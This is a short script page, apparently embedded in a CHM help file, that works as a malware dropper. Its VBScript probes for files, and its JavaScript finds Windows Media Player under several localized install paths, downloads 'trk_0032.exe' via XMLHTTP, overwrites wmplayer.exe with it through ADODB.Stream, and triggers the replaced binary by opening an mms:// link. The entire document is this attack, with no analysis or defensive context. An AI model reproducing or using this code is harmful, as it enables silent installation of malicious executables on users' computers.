<script language="vbscript">
    Function Exists(filename)
        On Error Resume Next
        LoadPicture(filename)
        Exists = Err.Number =  481
    End Function    
</script>

<script language="javascript">

    wmplayerpaths= [
            "C:\\Programmer\\Windows Media Player\\wmplayer.exe",
            "C:\\Program\\Windows Media Player\\wmplayer.exe",
            "C:\\Programme\\Windows Media Player\\wmplayer.exe",
            "C:\\Programmi\\Windows Media Player\\wmplayer.exe",
            "C:\\Programfiler\\Windows Media Player\\wmplayer.exe",
            "C:\\Programas\\Windows Media Player\\wmplayer.exe",
            "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",
            "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
           ];
    
    for (i=0;i<wmplayerpaths.length;i++) {
        wmplayerpath = wmplayerpaths[i];
        if (Exists(wmplayerpath))
            break;
    }

    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('TRACK32.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = getPath(location.href)+'trk_0032.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile(wmplayerpath,2);
    location.href = "mms://";
    
</script>
